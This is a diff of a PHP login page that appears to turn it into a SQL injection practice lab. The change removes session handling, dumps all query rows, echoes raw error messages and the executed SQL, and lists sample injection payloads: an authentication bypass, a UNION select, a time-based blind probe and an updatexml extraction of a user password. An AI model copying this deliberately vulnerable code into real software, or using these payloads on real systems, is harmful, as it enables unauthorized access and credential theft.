@@ -1,13 +1,8 @@
 <?php
-session_start();
 include __DIR__ . '/../db-connection.php';
 
-if (isset($_SESSION['username'])) {
-  header("Location: /dashboard.php");
-  exit;
-}
-
 $message = "";
+$sql = "";
 
 try {
   if ($_SERVER["REQUEST_METHOD"] == "POST") {
@@ -18,19 +13,21 @@ try {
     $result = $conn->query($sql);
 
     if ($result && $result->num_rows > 0) {
-      $row = $result->fetch_assoc();
+      $message .= "<pre>";
 
-      $_SESSION['username'] = $row['username'];
+      while ($row = $result->fetch_assoc()) {
+        $message .= print_r($row, true);
+        $message .= "\n" . str_repeat("-", 30) . "\n";
+      }
 
-      header("Location: /dashboard.php");
-      exit;
+      $message .= "</pre>";
     } else {
       $message = "Incorrect username or password.";
     }
   }
 } catch (Exception $e) {
   error_log($e->getMessage());
-  $message = "<h5 style='color: red;'>System error occurred.</h5>";
+  $message = $e->getMessage();
 } finally {
   if (isset($result) && $result instanceof mysqli_result) {
     $result->free();
@@ -52,45 +49,85 @@ try {
   <link href="../assets/sign-in.css" rel="stylesheet" />
 </head>
 
-<body class="d-flex align-items-center py-4 bg-body-tertiary">
-  <main class="form-signin w-100 m-auto">
-    <form method="POST" action="">
-      <h1 class="h3 mb-3 fw-normal">Please sign in</h1>
-      <p class="mt-5 mb-3 text-danger-emphasis"><?php echo $message; ?></p>
-      <div class="form-floating">
-        <input
-          type="text"
-          class="form-control"
-          id="floatingInput"
-          name="username"
-          placeholder="username" />
-        <label for="floatingInput">Username</label>
+<body>
+  <?php include __DIR__ . '/../includes/nav.php'; ?>
+  <div class="container-fluid">
+    <div class="row vh-100 py-5">
+      <div class="col-5 bg-dark text-white">
+        <form method="POST" action="">
+          <h4 class="h4 mb-3 fw-normal text-success-emphasis">Please sign in</h4>
+          <div class="form-floating">
+            <input
+              type="text"
+              class="form-control"
+              id="floatingInput"
+              name="username"
+              placeholder="username" />
+            <label for="floatingInput">Username</label>
+          </div>
+          <div class="form-floating">
+            <input
+              type="text"
+              class="form-control"
+              id="floatingPassword"
+              name="password"
+              placeholder="Password" />
+            <label for="floatingPassword">Password</label>
+          </div>
+          <div class="form-check text-start my-3">
+            <input
+              class="form-check-input"
+              type="checkbox"
+              value="remember-me"
+              id="checkDefault" />
+            <label class="form-check-label" for="checkDefault">
+              Remember me
+            </label>
+          </div>
+          <button class="btn btn-primary w-100 py-2" type="submit">
+            Sign in
+          </button>
+        </form>
+        <div class="my-5">
+
+          <ul class="list-group list-group-flush">
+            <li class="list-group-item text-warning-emphasis">Example</li>
+            <li class="list-group-item">in password ' or '1' = '1</li>
+            <li class="list-group-item">' or '1' = '1' or '</li>
+            <li class="list-group-item">' union select 1, version(), user() -- '</li>
+            <li class="list-group-item">' OR IF( (SELECT substr(database(),1,1))='a', SLEEP(2), 0 ) -- </li>
+            <li class="list-group-item">' AND updatexml(1, concat(0x3a, (SELECT password FROM users LIMIT 1)), 1) -- </li>
+          </ul>
+        </div>
       </div>
-      <div class="form-floating">
-        <input
-          type="text"
-          class="form-control"
-          id="floatingPassword"
-          name="password"
-          placeholder="Password" />
-        <label for="floatingPassword">Password</label>
+      <div class="col-auto d-flex justify-content-center">
+        <div class="vr"></div>
       </div>
-      <div class="form-check text-start my-3">
-        <input
-          class="form-check-input"
-          type="checkbox"
-          value="remember-me"
-          id="checkDefault" />
-        <label class="form-check-label" for="checkDefault">
-          Remember me
-        </label>
+      <div class="col">
+        <div class="card">
+          <div class="card-header text-info-emphasis">
+            SQL
+          </div>
+          <div class="card-body">
+            <p class="card-text">
+              <?php echo $sql; ?>
+            </p>
+          </div>
+        </div>
+        <div class="card mt-5">
+          <div class="card-header text-info-emphasis">
+            Message
+          </div>
+
+          <div class="card-body">
+            <p class="card-text">
+              <?php echo $message; ?>
+            </p>
+          </div>
+        </div>
       </div>
-      <button class="btn btn-primary w-100 py-2" type="submit">
-        Sign in
-      </button>
-      <p class="mt-5 mb-3 text-body-secondary">asdlkj</p>
-    </form>
-  </main>
+    </div>
+  </div>
 </body>
 
 </html>
